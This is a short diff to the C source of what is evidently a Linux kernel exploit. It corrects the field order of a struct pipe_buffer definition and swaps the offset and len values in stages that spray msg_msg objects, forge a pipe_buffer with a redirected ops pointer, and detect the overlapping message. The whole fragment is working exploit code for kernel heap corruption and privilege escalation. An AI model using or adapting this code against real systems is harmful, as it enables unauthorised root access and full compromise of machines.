@@ -175,8 +175,8 @@ void stage2(void)
 
 struct pipe_buffer {
     size_t page;
-    unsigned int len;
     unsigned int offset;
+    unsigned int len;
     size_t ops;
     unsigned int flags;
     size_t private;
@@ -204,8 +204,8 @@ void stage3(void)
     struct pipe_buffer *corr_pipe_buffer = (struct pipe_buffer *)(buffer + 8 + 4096 - MSG_HEADER);
     memset(corr_pipe_buffer, 0, sizeof(struct pipe_buffer));
     corr_pipe_buffer->page = vmemmap_pud;
-    corr_pipe_buffer->offset = 8;
-    corr_pipe_buffer->len = 15;
+    corr_pipe_buffer->offset = 15;
+    corr_pipe_buffer->len = 8;
     corr_pipe_buffer->ops = code_base+ANON_PIPE_BUF_OPS_OFFSET;
     corr_pipe_buffer->flags = 0x10;
     for (size_t i = 0; i < MSG_SPRAYS2; ++i)
@@ -265,7 +265,7 @@ void stage4(void)
         memset(buffer, 0, sizeof(buffer));
         get_msg(qids2[i], buffer, MSG_SIZE2, 0, MSG_COPY|IPC_NOWAIT);
         struct pipe_buffer *corr_pipe_buffer = (struct pipe_buffer *)(buffer + 8 + 4096 - MSG_HEADER);
-        if (corr_pipe_buffer->offset != 8 || corr_pipe_buffer->len != 15) {
+        if (corr_pipe_buffer->offset != 15 || corr_pipe_buffer->len != 8) {
             printf("[+] found overlayed msg_msg %zd\n", i);
             overlayed_id = i;
         }
